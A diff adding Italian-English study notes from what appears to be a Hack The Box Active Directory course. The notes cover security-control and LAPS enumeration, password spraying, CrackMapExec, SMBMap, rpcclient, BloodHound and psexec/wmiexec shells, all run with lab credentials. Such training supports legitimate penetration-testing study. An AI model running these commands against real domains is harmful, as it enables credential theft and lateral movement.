@@ -324,3 +324,192 @@ PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
+
+# Enumerating Security Controls
+
+## Windows defender
+
+`PS C:\htb> Get-MpComputerStatus`
+
+il parametro **RealTimeProtectionEnabled**, se e' settato a true la protezione e' abilitata
+
+
+## AppLocker
+
+AppLocker e' un application whitelist. Praticamente una lista dei software approvati che possono eseguire su un sistema. Spesso i sysadmin si mettono pure a bloccare roba tipo **cmd.exe** o **powershell.exe**.
+
+`PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`, enumera le policy di applocker
+
+## PoweShell constrained language mode
+E' una modalita' che blocca molte feature di powershell 
+
+`PS C:\htb> $ExecutionContext.SessionState.LanguageMode`, per vedere se e' attiva
+
+## LAPS
+
+LAPS (Local Administrator Password Solution) E' usata per randomizzare e ruotare le password degli amministratori locali su windows e prevenire lateral movement.
+
+Possiamo enumerare quale domain user puo' leggere le LAPS password per le macchine. il **LAPSToolkit** facilita molto. un modo e' parsare **ExtendedRights** per tutti i computer  enables.
+
+```
+PS C:\htb> Find-LAPSDelegatedGroups
+
+OrgUnit                                             Delegated Groups
+-------                                             ----------------
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+```
+
+il check **Find-AdmPwdExtendedRights** controlla i diritti su ogni computer  con LAPS abilitato per ogni gruppo.
+
+The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
+
+```
+PS C:\htb> Find-AdmPwdExtendedRights
+
+ComputerName                Identity                    Reason
+------------                --------                    ------
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
+
+```
+
+We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
+
+```
+PS C:\htb> Get-LAPSComputers
+
+ComputerName                Password       Expiration
+------------                --------       ----------
+DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
+EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
+SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
+WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
+```
+
+# Credential Enumeration from Linux
+
+### CrackMapExec Domain User enumeration (authenticated)
+
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`
+
+### CrackMapExec Domain Group Enumeration
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`
+
+### CME Logged on users
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users`
+
+ We can also see that our user forend is a local admin because (Pwn3d!) 
+
+### CME Share enumeration
+
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`
+
+### Spider_plus
+questa mode semlpicemente va a enumerare i file contenuti nelle share readables e outputta in un bel JSON (j4k1dibe@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json )
+
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'`
+
+### SMBMap check access
+
+`j4k1dibe@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
+
+### SMBMap ricorsivo per listare tutte directories
+`j4k1dibe@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`
+
+
+### Rpcclient 
+`rpcclient -U "" -N 172.16.5.5`, con NULL session
+
+### RPCclient enumeration
+
+Con RPCclient notiamo un field chiamato **rid** (Relative Identifier) un identificatore univoc rappresentato in hex che windows usa per identificare gli ogetti
+
+![image](https://github.com/user-attachments/assets/6c616f05-5b87-4d3b-ad77-c1fad86cd164)
+
+
+```
+rpcclient $> enumdomusers # questo enumera i rid
+
+rpcclient $> queryuser 0x457
+
+        User Name   :   htb-student
+        Full Name   :   Htb Student
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
+        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
+        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
+        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
+        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
+        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
+        unknown_2[0..31]...
+        user_rid :      0x457
+        group_rid:      0x201
+        acb_info :      0x00000010
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000001d
+        padding1[0..7]...
+        logon_hrs[0..21]...
+```
+
+## Impacket Toolkit
+
+impacket ha un botto di roba
+
+## psexec.py
+
+Se abbiamo un utente con local admin privs possiamo semplicemente loggarci e aprire una shell con psexec.py, funziona uploadando una roba nelle share
+
+## con wmiexec.py
+`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  `
+
+`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  `
+
+### Enumerate domain admins con windapsearch
+`j4k1dibe@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`
+
+### Enumrate privileged users
+`j4k1dibe@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`
+
+## BloodHound
+Bloodhound e' il tool piu' peso per AD. Rappresenta tutto in grafichi e ha pure una GUI. Raccoglie una marea di dati. Pero' deve essere runnato da autenticati ovviamente
+
+`j4k1dibe@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all `
+
+I risultati sono tutti i json
+
+### Uploeading zip to BloodHound GUI
+
+Se vogliamo possiamo zippare tutti gli output json con `zip -r ilfreight_bh.zip *.json` e carichiamo lo zip sulla GUI
+
+La gui ci fa vedre grafici, ossiamo vedere roba tipo lo shortest oath per il domain admin. Ci da path logici tramite utenti, gruppi, host etc,etc, e tutte le varie relazioni che ci possono aiutare a scalare fino a domain admin.
+
